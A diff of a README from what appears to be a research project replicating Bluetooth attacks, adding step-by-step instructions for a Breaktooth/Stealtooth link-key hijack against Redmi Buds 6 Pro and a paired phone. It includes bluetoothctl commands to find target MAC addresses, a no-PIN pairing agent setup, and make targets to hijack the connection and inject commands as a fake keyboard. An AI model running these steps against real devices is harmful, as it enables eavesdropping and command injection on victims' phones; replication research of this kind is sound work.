@@ -6,17 +6,69 @@ For this, we found multiple papers that described different attack scenarios. In
 
 There are 2 branches, main and mallory. Changes in main are only for debugging and flashing to the devices in order to replicate a real scenario. In mallory, the low-level Bluetooth driver code was changed so as to allow the BISON attack. 
 
-## Stealtooth
+# Stealtooth
 
-Paper that introduces and explains Stealtooth: https://arxiv.org/pdf/2507.00847
+Paper that introduces and explains Stealtooth: https://arxiv.org/pdf/2507.00847. Stealtooth builds on top of [Breaktooth](https://eprint.iacr.org/2024/900.pdf), which source code can be downloaded on [breaktooth.github.io](https://breaktooth.github.io/).
 
-MitM attack on well-known bluetooth earbuds/headphones, such as the Redmi Buds 6 Pro and Sony WF-1000XM5. The fundamental vulnerability being exploited here is in the automatic pairing functionality present in modern bluetooth devices. It is used to allow a more convenient user experience. The attack takes advantage of the behavior where audio devices, upon failing to reconnect with a previously paired source (phone, laptop, etc.), automatically transition into a pairing mode. This state can be triggerred by an attacker that blocks/jams the real signal, effectively forcing the bluetooth headphones to seek a new connection. In this vulnerable state, an attacker can impersonate the source device and initiate a pairing request.
+We will perform this attack on the `Redmi Buds 6 Pro`.
 
-Crucially, this results in "silent link key overwriting," where the headphones accept the attacker's new encryption key without requiring any manual user confirmation. Stealtooth combines this method of hijacking with the abuse of bluetooth “sleep mode” to achieve a full man-in-the-middle attack. The attacker is able to maintain connection while relaying traffic, enabling eavesdropping and injection of audio without the victim being aware of a compromised conneciton.
+Breaktooth exploits a vulnerability in the power savings implementation. Using this exploit, the bluetooth device accept the attacker's link key without requiring any manual user confirmation. This key then which overwrites the real link key silently, allowing to take over the connection.
 
-We have not started work on stealtooth as our efforts have been focused on BISON.
+Stealtooth then builds on top of Breaktooth to perform a MitM attack. After overwriting the link key on both A and B, the attack can pass through audio from A to B whilst at the same time eavesdropping or injecting audio, without the victim being aware of the compromised connection.
 
-## BISON
+## Implementation
+
+The first step to perform this attack is to find the device MAC address and device name:
+
+```
+sudo rfkill unblock bluetooth # for some reason was soft blocked on my pi
+
+sudo systemctl start bluetooth
+sudo bluetoothctl
+[bluetoothctl]> power on
+[bluetoothctl]> scan on
+# power on buds
+# [NEW] Device <MAC_B> Redmi Buds 6 Pro
+# power on bluetooth on phone
+# [NEW] Device <MAC_A> <PHONE>
+[bluetoothctl]> scan off
+[bluetoothctl]> exit
+```
+
+
+### Breaktooth
+
+Once we have obtained the MAC_B (of the buds) and the name, we can start using the Breaktooth tool. We have slightly modified this tool as the original source code does not work (anymore). You can find the updated code in the `breaktooth` directory.
+
+After downloading and unzipping, first switch to root user using `sudo su`. After that, install the dependencies using:
+```
+make install/deps
+```
+
+
+Make sure we are in NoInputNoOutput mode. This indicates that mallory has no capability for user input or output during the connection and pairing process, so the victim will not ask for a pairing PIN.
+```
+bluetoothctl
+[bluetoothctl]> agent off
+[bluetoothctl]> agent NoInputNoOutput
+[bluetoothctl]> default-agent
+```
+
+Next, we start our attack by preparing it with the correct MAC and device name
+
+```
+go # if you get "command not found", exit and sudo su again
+source venv/bin/activate
+make setup/device MAC=<MAC_B> NAME="Redmi Buds 6 Pro" TARGET=<MAC_A>
+```
+
+Lastly, to perform our attack we run `make breaktooth` that will continuously check the connection between A and B. As soon as the buds (B) enter power saving mode, we will send a request to the target (A) that will hijack the connection. Once the connection is hijacked (and mallory is registered as a input-keyboard device), we can run `make boot/injector` to run commands on the target.
+
+For now I have achieved running all the stuff above, but I can not get the buds to enter sleep mode. I can close the lid that seems to work, however, we then get a connection status of 111 (connection refused). This seems like it didn't properly entered in the sleep mode, but will have to investigate further.
+
+In addition, after closing the buds, somehow it seems like we actually did manage to overwrite the link key? Because once we followed the steps above, we can no longer connect A and B (but we can also not connect Mallory with either?).
+
+# BISON
 
 Paper that introduces and explains BISON: https://www.carloalbertoboano.com/documents/gasteiger23bison.pdf
 
@@ -46,7 +98,7 @@ Demo Image:
 
 The image above displays the terminal of Bob, who is the legitimate receiver of Alice's broadcast in this case. Bob is receiving a stream of incrementing numbers (92110-92118 in the image), which is interrupted by a successful BISON attack. The attacker injects a payload containing '666', which confirms the BIS hijack.
 
-### Setup steps
+## Setup steps
 
 Assumed hardware: 3x ProMicro nRF52840 (alice, bob, mallory)
 
